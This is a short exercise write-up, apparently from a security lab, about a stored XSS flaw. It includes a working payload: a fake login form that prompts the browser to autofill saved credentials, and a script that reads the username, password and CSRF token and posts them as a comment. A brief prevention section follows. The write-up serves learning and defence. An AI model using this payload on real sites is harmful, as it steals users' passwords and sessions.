Vulnerability:
	The server does not sanitize the input,
	Allowing an attacker to perform a Stored XSS.
	
Exploit:
	<form autocomplete="on">
	<input type="text" name="username" autocomplete="username" />
	<input type="password" name="password" autocomplete="current-password" />
	</form>

	<script>
		window.onload = function () {
			setTimeout(() => {
				const pwd = document.querySelector('input[type="password"]').value;
				const user = document.querySelector('input[name="username"]').value;
		  		const csrf = document.querySelector('input[name="csrf"]').value;

				fetch('https://server.net/post/comment', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/x-www-form-urlencoded'
					},
					credentials: 'include',
					body: `csrf=${csrf}&postId=2&comment=${pwd}:${user}&name=victim&email=victim%40gmail.com&website=http%3A%2F%2Fvictim.com`
				});
		  	}, 1000);
		};
	</script>

Explanation:
	<form> -> Create the username & password feild.
	<script> -> Waiting for the page to load,
		const -> Saves the username, password, csrf token in parameters.
		fetch -> Send a POST equest to the server to post the collected username & password.
	
Prevention:
	- Sanizite user input.
	- Use "HttpOnly" flag so JavaScript can't access the stored session/auth cookies.
